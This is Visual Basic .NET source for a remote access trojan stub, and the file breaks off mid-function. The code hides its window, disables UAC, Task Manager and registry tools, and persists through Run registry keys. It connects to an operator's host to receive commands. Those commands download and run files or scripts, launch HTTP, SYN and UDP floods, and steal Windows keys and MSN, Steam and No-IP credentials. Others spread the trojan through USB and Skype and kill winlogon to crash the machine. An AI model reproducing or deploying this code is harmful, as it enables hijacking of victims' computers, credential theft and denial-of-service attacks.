Imports System.Net, System.Net.Sockets, System.IO, System, System.Windows.Forms, System.Diagnostics, Microsoft.Win32, System.Timers
Imports System.Text
Imports System.Net.Mail
Imports evilsf1._0a.Stub
Imports System.Threading


Public Class Form1


    Public Function GetProductKey(ByVal KeyPath As String, ByVal ValueName As String) As String

        Dim HexBuf As Object = My.Computer.Registry.GetValue(KeyPath, ValueName, 0)

        If HexBuf Is Nothing Then Return "N/A"

        Dim tmp As String = ""

        For l As Integer = LBound(HexBuf) To UBound(HexBuf)
            tmp = tmp & " " & Hex(HexBuf(l))
        Next

        Dim StartOffset As Integer = 52
        Dim EndOffset As Integer = 67
        Dim Digits(24) As String

        Digits(0) = "B" : Digits(1) = "C" : Digits(2) = "D" : Digits(3) = "F"
        Digits(4) = "G" : Digits(5) = "H" : Digits(6) = "J" : Digits(7) = "K"
        Digits(8) = "M" : Digits(9) = "P" : Digits(10) = "Q" : Digits(11) = "R"
        Digits(12) = "T" : Digits(13) = "V" : Digits(14) = "W" : Digits(15) = "X"
        Digits(16) = "Y" : Digits(17) = "2" : Digits(18) = "3" : Digits(19) = "4"
        Digits(20) = "6" : Digits(21) = "7" : Digits(22) = "8" : Digits(23) = "9"

        Dim dLen As Integer = 29
        Dim sLen As Integer = 15
        Dim HexDigitalPID(15) As String
        Dim Des(30) As String

        Dim tmp2 As String = ""

        For i = StartOffset To EndOffset
            HexDigitalPID(i - StartOffset) = HexBuf(i)
            tmp2 = tmp2 & " " & Hex(HexDigitalPID(i - StartOffset))
        Next

        Dim KEYSTRING As String = ""

        For i As Integer = dLen - 1 To 0 Step -1
            If ((i + 1) Mod 6) = 0 Then
                Des(i) = "-"
                KEYSTRING = KEYSTRING & "-"
            Else
                Dim HN As Integer = 0
                For N As Integer = (sLen - 1) To 0 Step -1
                    Dim Value As Integer = ((HN * 2 ^ 8) Or HexDigitalPID(N))
                    HexDigitalPID(N) = Value \ 24
                    HN = (Value Mod 24)

                Next

                Des(i) = Digits(HN)
                KEYSTRING = KEYSTRING & Digits(HN)
            End If
        Next

        Return StrReverse(KEYSTRING)

    End Function  'Class Steal Windows Key
    Dim options(), text1, text2, text3, text4, text5, text6, text7, text8, text9, text10, text11, text12, text13, text14, text15, text16, text17, text18, text19, text20, text21 As String
    Const FileSplit = "@~mad-coder~@"
    Dim host As String = "127.0.0.1"
    Dim port As Integer = "3850"

    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer

    Const WM_COMMAND As Int32 = &H111
    Const MF_ENABLED As Int32 = &H0
    Const MF_GRAYED As Int32 = &H1
    Const LVM_FIRST As Int32 = &H1000
    Const LVM_DELETEITEM As Int32 = (LVM_FIRST + 8)
    Const LVM_SORTITEMS As Int32 = (LVM_FIRST + 48)
    Private Declare Function apiFindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Int32
    Private Declare Function apiFindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String, ByVal lpsz2 As String) As Int32
    Private Declare Function apiEnableWindow Lib "user32" Alias "EnableWindow" (ByVal hwnd As Int32, ByVal fEnable As Int32) As Boolean
    Private Declare Function apiGetMenu Lib "user32" Alias "GetMenu" (ByVal hwnd As Int32) As Int32
    Private Declare Function apiGetSubMenu Lib "user32" Alias "GetSubMenu" (ByVal hMenu As Int32, ByVal nPos As Int32) As Int32
    Private Declare Function apiGetMenuItemID Lib "user32" Alias "GetMenuItemID" (ByVal hMenu As Int32, ByVal nPos As Int32) As Int32
    Private Declare Function apiEnableMenuItem Lib "user32" Alias "EnableMenuItem" (ByVal hMenu As Int32, ByVal wIDEnableItem As Int32, ByVal wEnable As Int32) As Int32
    Private Declare Function apiSendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Int32, ByVal wMsg As Int32, ByVal wParam As Int32, ByVal lParam As String) As Int32
    Private Declare Function apiGetDesktopWindow Lib "user32" Alias "GetDesktopWindow" () As Int32
    Private Declare Function apiLockWindowUpdate Lib "user32" Alias "LockWindowUpdate" (ByVal hwndLock As Int32) As Int32

    Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000
    Private Const WM_APPCOMMAND As Integer = &H319
    Declare Function SendMessageW Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SPI_SETDESKWALLPAPER = 20
    Private Const SPIF_UPDATEINIFILE = &H1

    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal ByVallpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer

    Public Const SWP_HIDEWINDOW = &H80
    Public Const SWP_SHOWWINDOW = &H40
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Dim client As TcpClient
    Public sPath = Application.ExecutablePath
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)



    Public Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try


            FileOpen(1, sPath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            text1 = Space(LOF(1))
            text2 = Space(LOF(1))
            text3 = Space(LOF(1))
            text4 = Space(LOF(1))
            text5 = Space(LOF(1))
            text6 = Space(LOF(1))
            text7 = Space(LOF(1))
            text8 = Space(LOF(1))
            text9 = Space(LOF(1))
            text10 = Space(LOF(1))
            text11 = Space(LOF(1))
            text12 = Space(LOF(1))
            text13 = Space(LOF(1))
            text14 = Space(LOF(1))
            text15 = Space(LOF(1))
            text16 = Space(LOF(1))
            text17 = Space(LOF(1))
            text18 = Space(LOF(1))
            text19 = Space(LOF(1))
            text20 = Space(LOF(1))
            text21 = Space(LOF(1))

            FileGet(1, text1)
            FileGet(1, text2)
            FileGet(1, text3)
            FileGet(1, text4)
            FileGet(1, text5)
            FileGet(1, text6)
            FileGet(1, text7)
            FileGet(1, text8)
            FileGet(1, text9)
            FileGet(1, text10)
            FileGet(1, text11)
            FileGet(1, text12)
            FileGet(1, text13)
            FileGet(1, text14)
            FileGet(1, text15)
            FileGet(1, text16)
            FileGet(1, text17)
            FileGet(1, text18)
            FileGet(1, text19)
            FileGet(1, text20)
            FileGet(1, text21)
        
            FileClose(1)
            options = Split(text1, FileSplit)


            host = options(1)
            port = options(2)

            If options(3) = "1" Then
                Me.Opacity = "0"
                Me.Hide()
                Me.Visible = False
                Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
            End If

            If options(4) = "1" Then
                MsgBox(options(9), MsgBoxStyle.Information, options(8))
            End If
            If options(5) = "1" Then
                MsgBox(options(9), MsgBoxStyle.Question, options(8))
            End If
            If options(6) = "1" Then
                MsgBox(options(9), MsgBoxStyle.Exclamation, options(8))
            End If
            If options(7) = "1" Then
                MsgBox(options(9), MsgBoxStyle.Critical, options(8))
            End If

            If options(18) = "1" Then
                If My.Computer.Info.OSFullName.Contains("Vista") Or My.Computer.Info.OSFullName.Contains("7") Then
                    Dim key As RegistryKey

                    Try
                        key = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True)
                        Dim str As String = key.GetValue("EnableLUA").ToString()
                        If str = "1" Then
                            key.SetValue("EnableLUA", "0")
                        End If
                    Catch
                    End Try
                End If

            End If

            If options(10) = "1" Then
                If options(11) = "1" Then
                    System.IO.File.Copy(sPath, "C:\Windows\Temp\" & options(17) & ".exe")
                    Try
                        Dim CU As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                        With CU
                            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            .SetValue(options(16), "C:\Windows\Temp\" & options(17) & ".exe")
                        End With
                    Catch ex As Exception

                    End Try
                End If
                If options(12) = "1" Then
                    System.IO.File.Copy(sPath, "C:\Program Files\" & options(17) & ".exe")
                    Try
                        Dim CU As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                        With CU
                            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            .SetValue(options(16), "C:\Program Files\" & options(17) & ".exe")
                        End With
                    Catch ex As Exception

                    End Try
                End If
                If options(13) = "1" Then
                    System.IO.File.Copy(sPath, "C:\Windows\System32\" & options(17) & ".exe")
                    Try
                        Dim CU As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                        With CU
                            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            .SetValue(options(16), "C:\Windows\System32\" & options(17) & ".exe")
                        End With
                    Catch ex As Exception

                    End Try
                End If
                If options(14) = "1" Then
                    System.IO.File.Copy(sPath, "C:\Users\" & Environment.UserName & "\AppData\" & options(17) & ".exe")
                    Try
                        Dim CU As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                        With CU
                            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            .SetValue(options(16), "C:\Users\" & Environment.UserName & "\AppData\" & options(17) & ".exe")
                        End With
                    Catch ex As Exception

                    End Try
                End If
                If options(15) = "1" Then
                    System.IO.File.Copy(sPath, "C:\Windows\" & options(17) & ".exe")
                    Try
                        Dim CU As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                        With CU
                            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                            .SetValue(options(16), "C:\Windows\" & options(17) & ".exe")
                        End With
                    Catch ex As Exception

                    End Try
                End If
            End If
            If options(21) = "1" Then
                Dim T As New Thread(AddressOf Persistence)
                T.Start()
            End If
            If options(19) = "1" Then
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
            End If
            If options(20) = "1" Then
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Dim regKey As Microsoft.Win32.RegistryKey
                regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths", True)
                regKey.DeleteSubKey("MSCONFIG.EXE", True)
                regKey.Close()
            End If
        Catch ex As Exception
        End Try

        Connect()
        Timer1.Enabled = True

    End Sub
    Public Shared GetProcesses()() As Process
    Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Integer, ByVal dwExtraInfo As Integer)
    Private Const VK_SNAPSHOT As Short = &H2CS
    Sub Connect()
            Dim CPUName As String
            CPUName = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CentralProcessor\0", "ProcessorNameString", Nothing)
            Dim RAM As String
            RAM = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CentralProcessor\0", "~MHz", Nothing) & " MB"
            Try
                client = New TcpClient(host, port)
                Send("SERVER|" & Environment.UserName & "|" & My.Computer.Info.OSFullName & "|" & System.Globalization.RegionInfo.CurrentRegion.DisplayName & "|" & CPUName & "|" & RAM & "|1.6")
                client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
            Catch ex As Exception
                Threading.Thread.Sleep(4000)
                Connect()
            End Try

    End Sub
    Sub Read(ByVal ar As IAsyncResult)
        Dim message As String
        Try
            Dim reader As New StreamReader(client.GetStream())
            message = reader.ReadLine()
            Parse(message)
            client.GetStream().BeginRead(New Byte() {0}, 0, 0, AddressOf Read, Nothing)
        Catch ex As Exception
            Threading.Thread.Sleep(4000)
            Connect()
        End Try
    End Sub

    Sub Parse(ByVal Message As String)
        Try

            Dim cut() As String = Message.Split("|")
            Select Case cut(0)
                Case "DL"
                    Try
                        Dim w As New WebClient()
                        Dim temp As String = Path.GetTempFileName() + ".exe"
                        SendStatus("Status: Downloading File...")
                        w.DownloadFile(cut(1), temp)
                        Process.Start(temp)
                        SendStatus("         Status: File Executed!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Downloading File...")
                    End Try
                Case "CrasyDVD"
                    Try
                        CrasyDVD()
                    Catch ex As Exception
                        SendStatus("         Status: Error Crasy DVD...")
                    End Try

                Case "CLOSESERVER"
                    Try
                        SendStatus("         Status: Server Closed!")
                        Environment.Exit(0)
                    Catch ex As Exception
                        SendStatus("         Status: Error Closing Server...")
                    End Try
                Case "VBS"
                    Try
                        SendStatus("         Status: Try Run Script...")
                        If System.IO.File.Exists("C:\WINDOWS\Index.vbs") Then
                            File.Delete("C:\WINDOWS\Index.vbs")
                        Else
                        End If
                        SHTML.Text = cut(1)
                        Dim sw As New StreamWriter("C:\WINDOWS\Index.vbs")
                        sw.WriteLine(cut(1))
                        sw.Close()

                        Process.Start("C:\WINDOWS\Index.vbs")
                        SendStatus("         Status: Run Script!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "GETAV"
                    Try
                        SendStatus("         Status: Get AV...")
                        AVG()
                        AVGX86()
                        AvastX86()
                        Avast()
                        Kapersky()
                        KaperskyX86()
                        GDATA()
                        GDATAX86()
                    Catch ex As Exception
                        SendStatus("         Status: Error Get AV...")
                    End Try

                Case "HTTPF"
                    Try
                        SendStatus("         Status: DDOS Http....")
                        If HttpFloods.IsEnabled Then
                            HttpFloods.StopHttpFlood()
                        End If
                        HttpFloods.Host = cut(1)
                        HttpFloods.Interval = (7)
                        HttpFloods.Threads = 200
                        HttpFloods.StartHttpFlood()
                        SendStatus("         Status: DDOS HTTP!")
                    Catch ex As Exception
                        SendStatus("         Status: Error")
                    End Try
                Case "SCURSOR"
                    Try
                        SendStatus("         Status: Show Cursor...")
                        Cursor.Show()
                        SendStatus("         Status: Show Cursor!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "HCURSOR"
                    Try
                        SendStatus("         Status: Hide Cursor...")
                        Cursor.Hide()
                        SendStatus("         Status: Hide Cursor!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "SUDP"
                    Try
                        SendStatus("         Status: Stop DDOS UDP...")
                        SendStatus("         Status: Stop DDOS UDP!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Stop DDOS UDP...")
                    End Try
                Case "Msn"
                    Try
                        SendStatus("         Status: Msn Stealer...")
                        getPwd()
                        MsnSend()
                        SendStatus("         Status: Msn Stealer!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "HTTPS"
                    Try
                        SendStatus("         Status: Stop DDOS Http....")
                        HttpFloods.StopHttpFlood()
                        SendStatus("       Status: Stop DDOS HTTP!")
                    Catch ex As Exception
                        SendStatus("         Status: Error")
                    End Try
                Case "SYN"
                    Try
                        SendStatus("         Status: Syn Flood...")
                        SynFlood.Host = cut(1)
                        SynFlood.Port = 80
                        SynFlood.Threads = 256
                        SynFlood.SynSockets = 256
                        SynFlood.StartSynFlood()
                        SendStatus("         Status: Syn Flood!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "SSYN"
                    Try
                        SendStatus("         Status: Stop Syn Flood...")
                        SynFlood.StartSynFlood()
                        SendStatus("         Status: Stop Syn Flood!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "CLEANS"
                    Try
                        SendStatus("         Status: Clean...")
                        If System.IO.File.Exists("C:\WINDOWS\Index.bat") Then
                            File.Delete("C:\WINDOWS\Index.bat")
                        End If
                        If System.IO.File.Exists("C:\WINDOWS\Index.vbs") Then
                            File.Delete("C:\WINDOWS\Index.vbs")
                        End If
                        If System.IO.File.Exists("C:\WINDOWS\Index.txt") Then
                            File.Delete("C:\WINDOWS\Index.txt")
                        End If
                        SendStatus("         Status: Clean!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "HTML"
                    Try
                        SendStatus("         Status: Try Run Script...")
                        If System.IO.File.Exists("C:\WINDOWS\Index.bat") Then
                            File.Delete("C:\WINDOWS\Index.bat")
                        Else
                        End If
                        SHTML.Text = cut(1)
                        Dim sw As New StreamWriter("C:\WINDOWS\Index.bat")
                        sw.WriteLine(cut(1))
                        sw.Close()

                        Process.Start("C:\WINDOWS\Index.bat")
                        SendStatus("         Status: Run Script!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "WINKEY"
                    Try
                        SendStatus("         Status: Try Steal Windows Key...")
                        WINKEY()
                        SendStatus("         Status: Windows Key Steal!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Windows Key not Steal...")
                    End Try
                    '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
                Case "STEALALL"
                    Try
                        SendStatus("        Status: Steal All...")

                        SendStatus("        Status: Steal All!")
                    Catch ex As Exception
                        SendStatus("        Status: Error...")
                    End Try
                Case "FPSC"
                    Try
                        SendStatus("         Status: Try Steal FPSC Key...")
                        FPSC()
                        SendStatus("         Status: FPSC Key Steal!")
                    Catch ex As Exception
                        SendStatus("         Status: Error ...")
                    End Try
                Case "NOIPSTEAL"
                    Try
                        SendStatus("         Status: No-Ip Steal...")
                        IpRecord()
                        NOIPS()
                        SendStatus("         Status: No-Ip Steal!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                    ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
                Case "PCLOGOFF"
                    Try
                        SendStatus("         Status: PC LogOff...")
                        System.Diagnostics.Process.Start("shutdown", "-l -t 00")
                        SendStatus("         Status: PC LogOff!")
                    Catch ex As Exception
                        SendStatus("         Status: Error PC LogOff...")
                    End Try

                Case "DisableKey/Mouse"

                    Try
                        SendStatus("         Status: Disable Keyboard and mouse...")
                        apiBlockInput(0)
                        SendStatus("         Status: Disable Keyboard and mouse!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Disable Keyboard and mouse...")
                    End Try

                Case "EnableKey/Mouse"
                    Try
                        SendStatus("         Status: Enable Keyboard and mouse...")
                        apiBlockInput(1)
                        SendStatus("         Status: Enable Keyboard and mouse!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Enable Keyboard and mouse...")
                    End Try
                Case "PCSHUTDOWN"
                    Try
                        SendStatus("         Status: PC ShutDown...")
                        System.Diagnostics.Process.Start("shutdown", "-s -t 00")
                        SendStatus("         Status: PC ShutDown!")
                    Catch ex As Exception
                        SendStatus("         Status: Error PC ShutDown...")
                    End Try
                Case "PCRESTART"
                    Try
                        SendStatus("         Status: PC Restart...")
                        System.Diagnostics.Process.Start("shutdown", "-r -t 00")
                        SendStatus("         Status: PC Restart!")
                    Catch ex As Exception
                        SendStatus("         Status: Error PC Restart...")
                    End Try

                Case "STARTPROCESS"
                    Try
                        SendStatus("         Status: Start Process...")
                        Process.Start(cut(1))
                        SendStatus("         Status: Start Process!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Start Process...")
                    End Try

                Case "CHANGEHP"
                    Try
                        SendStatus("         Status: Change Home Page...")
                        AddHome(cut(0))
                        SendStatus("         Status: Change Home Page!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "OpenDVD"
                    Try
                        SendStatus("         Status: Open DVD...")
                        mciSendString("Set CDAudio Door Open Wait", 0&, 0&, 0&)
                        SendStatus("         Status: Open DVD!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Open DVD...")
                    End Try
                Case "SKYPESPREAD"
                    Try
                        SendStatus("         Status: Skype Spread...")
                        Dim skype As Object
                        skype = CreateObject("Skype4COM.Skype", "")
                        skype.Client.Start()
                        skype.Attach()
                        For Each User In skype.Friends
                            skype.SendMessage(User.Handle, cut(1))
                        Next
                        SendStatus("         Status: Skype Spread!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "MTON"
                    Try
                        SendStatus("         Status: Monitor Turn On...")
                        SendMessage(-1, &H112, &HF170, -1)
                        SendStatus("         Status: Monitor Turn On!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Monitor Turn On...")
                    End Try
                Case "MTOFF"
                    Try
                        SendStatus("         Status: Monitor Turn Off...")
                        SendMessage(-1, &H112, &HF170, 2)
                        SendStatus("         Status: Monitor Turn Off!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Monitor Turn Off...")
                    End Try
                Case "UDP"
                    Try
                        SendStatus("         Status: UDP Flood...")
                        TextBox11.Text = cut(1)
                        Do
                            Dim udpClient As New UdpClient
                            Dim GLOIP As IPAddress
                            Dim bytCommand As Byte() = New Byte() {}
                            GLOIP = IPAddress.Parse(TextBox11.Text)
                            udpClient.Connect(GLOIP, "80")
                            bytCommand = Encoding.ASCII.GetBytes("BLAAAAAAAAAAAAAAAASDASGADGSDFRGSDFGSDFGSDFGSDFGSDFGSER$45645647658475690457694056ASFEASFGFGHFGJGHJGHASGFGFJADSFGFGHDFHAGSHGFHGAGHFG​J")
                            udpClient.Send(bytCommand, bytCommand.Length)
                        Loop
                        SendStatus("         Status: UDP Flood!")
                    Catch ex As Exception
                        SendStatus("         Status: Error UDP Flood...")
                    End Try
                Case "GUDP"
                    Try
                        SendStatus("         Status: UDP Flood...")
                        TextBox11.Text = cut(1)
                        Do
                            Dim udpClient As New UdpClient
                            Dim GLOIP As IPAddress
                            Dim bytCommand As Byte() = New Byte() {}
                            GLOIP = IPAddress.Parse(TextBox11.Text)
                            udpClient.Connect(GLOIP, TextGame.Text)
                            bytCommand = Encoding.ASCII.GetBytes("BLAAAAAAAAAAAAAAAASDASGADGSDFRGSDFGSDFGSDFGSDFGSDFGSER$45645647658475690457694056ASFEASFGFGHFGJGHJGHASGFGFJADSFGFGHDFHAGSHGFHGAGHFG​J")
                            udpClient.Send(bytCommand, bytCommand.Length)
                        Loop
                        SendStatus("         Status: UDP Flood!")
                    Catch ex As Exception
                        SendStatus("         Status: Error UDP Flood...")
                    End Try
                Case "gport"
                    Try
                        SendStatus("         Status: Set Port...")
                        TextGame.Text = cut(1)
                        SendStatus("         Status: Set Port!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "CloseDVD"
                    Try
                        SendStatus("         Status: Close DVD...")
                        mciSendString("Set CDAudio Door Closed Wait", 0&, 0&, 0&)
                        SendStatus("         Status: Close DVD!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Close DVD...")
                    End Try
                Case "USBSPREAD"
                    Try
                        SendStatus("         Status: Usb Spread...")
                        UsbSpread()
                        SendStatus("         Status: Usb Spread!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Usb Spread...")
                    End Try
                Case "OPENPROGRAM"
                    Try
                        SendStatus("         Status: Opening Program...")
                        Shell(cut(1), AppWinStyle.NormalFocus)
                        SendStatus("         Status: Program Opened!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Opening Program...")
                    End Try
                Case "DISABLETASK"
                    Try
                        SendStatus("         Status: Disable Task Manager...")
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                        SendStatus("         Status: Disabble Task Manager!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Disable Task Manager ...")
                    End Try
                Case "DisableRegistre"
                    Try
                        SendStatus("         Status: Disable Registry...")
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                        SendStatus("         Status: Disable Registry!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Disable Registry...")
                    End Try
                Case "HIDETASKBAR"
                    Try
                        SendStatus("         Status: Hide TaskBar...")
                        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
                        SendStatus("         Status: Hide TaskBar!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Hide TaskBar...")
                    End Try
                Case "DISABLECMD"
                    Try
                        SendStatus("         Status: Disable Cmd...")
                        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                        SendStatus("         Status: Disable Cmd!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Disable Cmd...")
                    End Try
                Case "SHOWTASKBAR"
                    Try
                        SendStatus("         Status: Show TaskBar...")
                        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
                        SendStatus("         Status: Show TaskBar!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Show TaskBar...")
                    End Try
                Case "Steam"
                    Try
                        SendStatus("         Status: Steal Steam...")
                        TextSteam.Text = GetSteamUsername()
                        SendSteam()
                        SendStatus("         Status: Steal Steam!")
                    Catch ex As Exception
                        SendStatus("         Status: Victime don't have Steam...")
                    End Try
                Case "BSOD"
                    Try
                        SendStatus("         Status: BSOD...")
                        Dim pProcess() As Process = System.Diagnostics.Process.GetProcessesByName("winlogon")
                        For Each p As Process In pProcess
                            p.Kill()
                        Next
                        SendStatus("         Status: BSOD!")
                    Catch ex As Exception
                        SendStatus("         Status: Error...")
                    End Try
                Case "DISABLECONTROL"
                    Try
                        SendStatus("         Status: Disable Control Panel...")
                        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", vbNormalFocus)
                        SendStatus("         Status: Disable Control Panel!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Disable Control Panel...")
                    End Try
                Case "SPEAK"
                    Try
                        SendStatus("        Status: Speak...")
                        Dim sapi
                        sapi = CreateObject("sapi.spvoice")
                        sapi.Speak(cut(1))

                        SendStatus("        Status: Speak!")
                    Catch ex As Exception
                        SendStatus("        Status: Error...")
                    End Try
                Case "CLOSEPROCESS"
                    Try
                        SendStatus("        Status: Close Process...")
                        Dim pProcess() As Process = System.Diagnostics.Process.GetProcessesByName(cut(1))

                        For Each p As Process In pProcess
                            p.Kill()
                        Next
                        SendStatus("        Status: Close Process!")
                    Catch ex As Exception
                        SendStatus("        Status: Error Close Process...")
                    End Try
                Case "OPENURL"
                    Try
                        SendStatus("         Status: Opening URL...")
                        Process.Start(cut(1))
                        SendStatus("         Status: URL Opened!")
                    Catch ex As Exception
                        SendStatus("         Status: Error Opening URL...")
                    End Try
                Case "RIGHTCLICKENABLE"
                    Try
                        RCK()
                    Catch ex As Exception
                        SendStatus("         Status: Error Right Click Enable...")
                    End Try
                Case "RIGHTCLICKDISABLE"
                    Try
                        RCD()
                    Catch ex As Exception
                        SendStatus("         Status: Error Right Click Disable...")
                    End Try
                Case "BLOCKWEBSITE"
                    Try
                        SendStatus("         Status: Try blocking website...")
                        Dim hihi As New System.IO.StreamWriter(Environ("windir") + "\System32\drivers\etc\hosts")
                        hihi.WriteLine(vbNewLine + "127.0.0.1 " + cut(1))
                        hihi.Close()
                        SendStatus("         Status: Website blocked!")
                    Catch ex As Exception
                        SendStatus("         Status: Error blocking website...")
                    End Try
                Case "MUTESOUND"
                    Try
                        SendStatus("         Status: Try mute the sound...")
                        SendMessageW(Me.Handle, WM_APPCOMMAND, Me.Handle, CType(APPCOMMAND_VOLUME_MUTE, IntPtr))
                        SendStatus("         Status: Sound Muted!")
                    Catch ex As Exception
                        SendStatus("         Status: Error during muting sound...")
                    End Try
                Case "CHANGEBACKGROUND"
                    Try
                        SendStatus("         Status: Downloading wallpaper...")
                        ChangeWallpaper(cut(1))
                        SendStatus("         Status: Background modified !")
                    Catch ex As Exception
                        SendStatus("         Status: Error durring changing wallpaper...")
                    End Try
                Case "FAKEMSG"
                    Dim Choose As String
                    Try
                        Choose = cut(1)
                        SendStatus("         Status: Try sending fake message...")
                        If Choose = "1" Then
                            MsgBox(cut(3), MsgBoxStyle.Information, cut(2))
                        End If
                        If Choose = "3" Then
                            MsgBox(cut(3), MsgBoxStyle.Exclamation, cut(2))
                        End If
                        If Choose = "2" Then
                            MsgBox(cut(3), MsgBoxStyle.Question, cut(2))
                        End If
                        If Choose = "4" Then
                            MsgBox(cut(3), MsgBoxStyle.Critical, cut(2))
                        End If
                        SendStatus("         Status: Fake message sended !")
                    Catch ex As Exception
                        SendStatus("         Status: Error send fake message...")
                    End Try
            End Select
        Catch ex As Exception

        End Try
    End Sub

    Sub Send(ByVal message As String)
        Try
